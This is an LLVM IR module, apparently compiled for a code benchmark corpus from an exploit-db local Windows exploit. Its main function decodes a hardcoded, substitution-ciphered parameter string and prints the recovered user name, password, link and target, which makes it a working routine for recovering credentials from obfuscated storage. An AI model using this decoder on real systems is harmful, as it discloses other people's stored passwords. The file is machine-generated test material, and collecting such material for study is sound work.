; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_22329.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_22329.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.param = private unnamed_addr constant [82 x i8] c"6|4|36|0|cftzmapuxnrsjibgwykqvleodhlfegvwcwlczccg://qqq.axbbwwahg.axe/enyyvw.zcev\00", align 16
@.str = private unnamed_addr constant [14 x i8] c"Memory error\0A\00", align 1
@.str.1 = private unnamed_addr constant [49 x i8] c"User: \09\09%s\0APassword: \09%s\0ALink: \09\09%s\0ATarget: \09%s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca [82 x i8], align 16
  %7 = alloca [1024 x i8], align 16
  %8 = alloca [1024 x i8], align 16
  %9 = alloca [5 x i8], align 1
  %10 = alloca [3 x i32], align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %15 = bitcast [82 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %15, i8* align 16 getelementptr inbounds ([82 x i8], [82 x i8]* @__const.main.param, i32 0, i32 0), i64 82, i1 false)
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  store i32 0, i32* %13, align 4
  store i32 0, i32* %14, align 4
  br label %16

16:                                               ; preds = %64, %0
  %17 = load i32, i32* %12, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds [82 x i8], [82 x i8]* %6, i64 0, i64 %18
  %20 = load i8, i8* %19, align 1
  %21 = icmp ne i8 %20, 0
  br i1 %21, label %22, label %67

22:                                               ; preds = %16
  %23 = load i32, i32* %13, align 4
  %24 = icmp sle i32 %23, 3
  br i1 %24, label %25, label %54

25:                                               ; preds = %22
  %26 = load i32, i32* %12, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds [82 x i8], [82 x i8]* %6, i64 0, i64 %27
  %29 = load i8, i8* %28, align 1
  %30 = sext i8 %29 to i32
  %31 = icmp eq i32 %30, 124
  br i1 %31, label %32, label %43

32:                                               ; preds = %25
  %33 = load i32, i32* %11, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds [5 x i8], [5 x i8]* %9, i64 0, i64 %34
  store i8 0, i8* %35, align 1
  store i32 0, i32* %11, align 4
  %36 = getelementptr inbounds [5 x i8], [5 x i8]* %9, i64 0, i64 0
  %37 = call i32 @atoi(i8* %36)
  %38 = load i32, i32* %13, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [3 x i32], [3 x i32]* %10, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  %41 = load i32, i32* %13, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %13, align 4
  br label %53

43:                                               ; preds = %25
  %44 = load i32, i32* %12, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [82 x i8], [82 x i8]* %6, i64 0, i64 %45
  %47 = load i8, i8* %46, align 1
  %48 = load i32, i32* %11, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds [5 x i8], [5 x i8]* %9, i64 0, i64 %49
  store i8 %47, i8* %50, align 1
  %51 = load i32, i32* %11, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %11, align 4
  br label %53

53:                                               ; preds = %43, %32
  br label %64

54:                                               ; preds = %22
  %55 = load i32, i32* %12, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds [82 x i8], [82 x i8]* %6, i64 0, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = load i32, i32* %14, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 %60
  store i8 %58, i8* %61, align 1
  %62 = load i32, i32* %14, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %14, align 4
  br label %64

64:                                               ; preds = %54, %53
  %65 = load i32, i32* %12, align 4
  %66 = add nsw i32 %65, 1
  store i32 %66, i32* %12, align 4
  br label %16

67:                                               ; preds = %16
  %68 = load i32, i32* %14, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 %69
  store i8 0, i8* %70, align 1
  store i32 0, i32* %12, align 4
  br label %71

71:                                               ; preds = %140, %67
  %72 = load i32, i32* %12, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 %73
  %75 = load i8, i8* %74, align 1
  %76 = icmp ne i8 %75, 0
  br i1 %76, label %77, label %143

77:                                               ; preds = %71
  %78 = load i32, i32* %12, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 %79
  %81 = load i8, i8* %80, align 1
  %82 = sext i8 %81 to i32
  %83 = icmp sge i32 %82, 65
  br i1 %83, label %84, label %104

84:                                               ; preds = %77
  %85 = load i32, i32* %12, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 %86
  %88 = load i8, i8* %87, align 1
  %89 = sext i8 %88 to i32
  %90 = icmp sle i32 %89, 90
  br i1 %90, label %91, label %104

91:                                               ; preds = %84
  %92 = load i32, i32* %12, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 %93
  %95 = load i8, i8* %94, align 1
  %96 = sext i8 %95 to i32
  %97 = sub nsw i32 %96, 39
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 %98
  %100 = load i8, i8* %99, align 1
  %101 = load i32, i32* %12, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 %102
  store i8 %100, i8* %103, align 1
  br label %140

104:                                              ; preds = %84, %77
  %105 = load i32, i32* %12, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 %106
  %108 = load i8, i8* %107, align 1
  %109 = sext i8 %108 to i32
  %110 = icmp sge i32 %109, 97
  br i1 %110, label %111, label %131

111:                                              ; preds = %104
  %112 = load i32, i32* %12, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 %113
  %115 = load i8, i8* %114, align 1
  %116 = sext i8 %115 to i32
  %117 = icmp sle i32 %116, 122
  br i1 %117, label %118, label %131

118:                                              ; preds = %111
  %119 = load i32, i32* %12, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 %120
  %122 = load i8, i8* %121, align 1
  %123 = sext i8 %122 to i32
  %124 = sub nsw i32 %123, 97
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 %125
  %127 = load i8, i8* %126, align 1
  %128 = load i32, i32* %12, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 %129
  store i8 %127, i8* %130, align 1
  br label %139

131:                                              ; preds = %111, %104
  %132 = load i32, i32* %12, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 %133
  %135 = load i8, i8* %134, align 1
  %136 = load i32, i32* %12, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 %137
  store i8 %135, i8* %138, align 1
  br label %139

139:                                              ; preds = %131, %118
  br label %140

140:                                              ; preds = %139, %91
  %141 = load i32, i32* %12, align 4
  %142 = add nsw i32 %141, 1
  store i32 %142, i32* %12, align 4
  br label %71

143:                                              ; preds = %71
  %144 = load i32, i32* %12, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 %145
  store i8 0, i8* %146, align 1
  %147 = getelementptr inbounds [3 x i32], [3 x i32]* %10, i64 0, i64 0
  %148 = load i32, i32* %147, align 4
  %149 = add nsw i32 %148, 1
  %150 = sext i32 %149 to i64
  %151 = mul i64 %150, 1
  %152 = trunc i64 %151 to i32
  %153 = call i64 @malloc(i32 %152)
  %154 = inttoptr i64 %153 to i8*
  store i8* %154, i8** %3, align 8
  %155 = icmp ne i8* %154, null
  br i1 %155, label %156, label %186

156:                                              ; preds = %143
  %157 = getelementptr inbounds [3 x i32], [3 x i32]* %10, i64 0, i64 1
  %158 = load i32, i32* %157, align 4
  %159 = add nsw i32 %158, 1
  %160 = sext i32 %159 to i64
  %161 = mul i64 %160, 1
  %162 = trunc i64 %161 to i32
  %163 = call i64 @malloc(i32 %162)
  %164 = inttoptr i64 %163 to i8*
  store i8* %164, i8** %2, align 8
  %165 = icmp ne i8* %164, null
  br i1 %165, label %166, label %186

166:                                              ; preds = %156
  %167 = getelementptr inbounds [3 x i32], [3 x i32]* %10, i64 0, i64 2
  %168 = load i32, i32* %167, align 4
  %169 = add nsw i32 %168, 1
  %170 = sext i32 %169 to i64
  %171 = mul i64 %170, 1
  %172 = trunc i64 %171 to i32
  %173 = call i64 @malloc(i32 %172)
  %174 = inttoptr i64 %173 to i8*
  store i8* %174, i8** %4, align 8
  %175 = icmp ne i8* %174, null
  br i1 %175, label %176, label %186

176:                                              ; preds = %166
  %177 = getelementptr inbounds [3 x i32], [3 x i32]* %10, i64 0, i64 3
  %178 = load i32, i32* %177, align 4
  %179 = add nsw i32 %178, 1
  %180 = sext i32 %179 to i64
  %181 = mul i64 %180, 1
  %182 = trunc i64 %181 to i32
  %183 = call i64 @malloc(i32 %182)
  %184 = inttoptr i64 %183 to i8*
  store i8* %184, i8** %5, align 8
  %185 = icmp ne i8* %184, null
  br i1 %185, label %188, label %186

186:                                              ; preds = %176, %166, %156, %143
  %187 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0))
  store i32 1, i32* %1, align 4
  br label %322

188:                                              ; preds = %176
  store i32 0, i32* %13, align 4
  store i32 26, i32* %14, align 4
  %189 = load i32, i32* %14, align 4
  store i32 %189, i32* %12, align 4
  store i32 0, i32* %13, align 4
  br label %190

190:                                              ; preds = %206, %188
  %191 = load i32, i32* %12, align 4
  %192 = getelementptr inbounds [3 x i32], [3 x i32]* %10, i64 0, i64 0
  %193 = load i32, i32* %192, align 4
  %194 = load i32, i32* %14, align 4
  %195 = add nsw i32 %193, %194
  %196 = icmp slt i32 %191, %195
  br i1 %196, label %197, label %211

197:                                              ; preds = %190
  %198 = load i32, i32* %12, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 %199
  %201 = load i8, i8* %200, align 1
  %202 = load i8*, i8** %3, align 8
  %203 = load i32, i32* %13, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds i8, i8* %202, i64 %204
  store i8 %201, i8* %205, align 1
  br label %206

206:                                              ; preds = %197
  %207 = load i32, i32* %12, align 4
  %208 = add nsw i32 %207, 1
  store i32 %208, i32* %12, align 4
  %209 = load i32, i32* %13, align 4
  %210 = add nsw i32 %209, 1
  store i32 %210, i32* %13, align 4
  br label %190

211:                                              ; preds = %190
  %212 = load i8*, i8** %3, align 8
  %213 = load i32, i32* %13, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds i8, i8* %212, i64 %214
  store i8 0, i8* %215, align 1
  %216 = getelementptr inbounds [3 x i32], [3 x i32]* %10, i64 0, i64 0
  %217 = load i32, i32* %216, align 4
  %218 = load i32, i32* %14, align 4
  %219 = add nsw i32 %218, %217
  store i32 %219, i32* %14, align 4
  %220 = load i32, i32* %14, align 4
  store i32 %220, i32* %12, align 4
  store i32 0, i32* %13, align 4
  br label %221

221:                                              ; preds = %237, %211
  %222 = load i32, i32* %12, align 4
  %223 = getelementptr inbounds [3 x i32], [3 x i32]* %10, i64 0, i64 1
  %224 = load i32, i32* %223, align 4
  %225 = load i32, i32* %14, align 4
  %226 = add nsw i32 %224, %225
  %227 = icmp slt i32 %222, %226
  br i1 %227, label %228, label %242

228:                                              ; preds = %221
  %229 = load i32, i32* %12, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 %230
  %232 = load i8, i8* %231, align 1
  %233 = load i8*, i8** %2, align 8
  %234 = load i32, i32* %13, align 4
  %235 = sext i32 %234 to i64
  %236 = getelementptr inbounds i8, i8* %233, i64 %235
  store i8 %232, i8* %236, align 1
  br label %237

237:                                              ; preds = %228
  %238 = load i32, i32* %12, align 4
  %239 = add nsw i32 %238, 1
  store i32 %239, i32* %12, align 4
  %240 = load i32, i32* %13, align 4
  %241 = add nsw i32 %240, 1
  store i32 %241, i32* %13, align 4
  br label %221

242:                                              ; preds = %221
  %243 = load i8*, i8** %2, align 8
  %244 = load i32, i32* %13, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds i8, i8* %243, i64 %245
  store i8 0, i8* %246, align 1
  %247 = getelementptr inbounds [3 x i32], [3 x i32]* %10, i64 0, i64 1
  %248 = load i32, i32* %247, align 4
  %249 = load i32, i32* %14, align 4
  %250 = add nsw i32 %249, %248
  store i32 %250, i32* %14, align 4
  %251 = load i32, i32* %14, align 4
  store i32 %251, i32* %12, align 4
  store i32 0, i32* %13, align 4
  br label %252

252:                                              ; preds = %268, %242
  %253 = load i32, i32* %12, align 4
  %254 = getelementptr inbounds [3 x i32], [3 x i32]* %10, i64 0, i64 2
  %255 = load i32, i32* %254, align 4
  %256 = load i32, i32* %14, align 4
  %257 = add nsw i32 %255, %256
  %258 = icmp slt i32 %253, %257
  br i1 %258, label %259, label %273

259:                                              ; preds = %252
  %260 = load i32, i32* %12, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 %261
  %263 = load i8, i8* %262, align 1
  %264 = load i8*, i8** %4, align 8
  %265 = load i32, i32* %13, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds i8, i8* %264, i64 %266
  store i8 %263, i8* %267, align 1
  br label %268

268:                                              ; preds = %259
  %269 = load i32, i32* %12, align 4
  %270 = add nsw i32 %269, 1
  store i32 %270, i32* %12, align 4
  %271 = load i32, i32* %13, align 4
  %272 = add nsw i32 %271, 1
  store i32 %272, i32* %13, align 4
  br label %252

273:                                              ; preds = %252
  %274 = load i8*, i8** %4, align 8
  %275 = load i32, i32* %13, align 4
  %276 = sext i32 %275 to i64
  %277 = getelementptr inbounds i8, i8* %274, i64 %276
  store i8 0, i8* %277, align 1
  %278 = getelementptr inbounds [3 x i32], [3 x i32]* %10, i64 0, i64 2
  %279 = load i32, i32* %278, align 4
  %280 = load i32, i32* %14, align 4
  %281 = add nsw i32 %280, %279
  store i32 %281, i32* %14, align 4
  %282 = load i32, i32* %14, align 4
  store i32 %282, i32* %12, align 4
  store i32 0, i32* %13, align 4
  br label %283

283:                                              ; preds = %299, %273
  %284 = load i32, i32* %12, align 4
  %285 = getelementptr inbounds [3 x i32], [3 x i32]* %10, i64 0, i64 3
  %286 = load i32, i32* %285, align 4
  %287 = load i32, i32* %14, align 4
  %288 = add nsw i32 %286, %287
  %289 = icmp slt i32 %284, %288
  br i1 %289, label %290, label %304

290:                                              ; preds = %283
  %291 = load i32, i32* %12, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 %292
  %294 = load i8, i8* %293, align 1
  %295 = load i8*, i8** %5, align 8
  %296 = load i32, i32* %13, align 4
  %297 = sext i32 %296 to i64
  %298 = getelementptr inbounds i8, i8* %295, i64 %297
  store i8 %294, i8* %298, align 1
  br label %299

299:                                              ; preds = %290
  %300 = load i32, i32* %12, align 4
  %301 = add nsw i32 %300, 1
  store i32 %301, i32* %12, align 4
  %302 = load i32, i32* %13, align 4
  %303 = add nsw i32 %302, 1
  store i32 %303, i32* %13, align 4
  br label %283

304:                                              ; preds = %283
  %305 = load i8*, i8** %5, align 8
  %306 = load i32, i32* %13, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds i8, i8* %305, i64 %307
  store i8 0, i8* %308, align 1
  %309 = load i8*, i8** %3, align 8
  %310 = load i8*, i8** %2, align 8
  %311 = load i8*, i8** %4, align 8
  %312 = load i8*, i8** %5, align 8
  %313 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.1, i64 0, i64 0), i8* %309, i8* %310, i8* %311, i8* %312)
  %314 = load i8*, i8** %2, align 8
  %315 = call i32 @free(i8* %314)
  %316 = load i8*, i8** %3, align 8
  %317 = call i32 @free(i8* %316)
  %318 = load i8*, i8** %4, align 8
  %319 = call i32 @free(i8* %318)
  %320 = load i8*, i8** %5, align 8
  %321 = call i32 @free(i8* %320)
  store i32 0, i32* %1, align 4
  br label %322

322:                                              ; preds = %304, %186
  %323 = load i32, i32* %1, align 4
  ret i32 %323
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @atoi(i8*) #2

declare dso_local i64 @malloc(i32) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @free(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
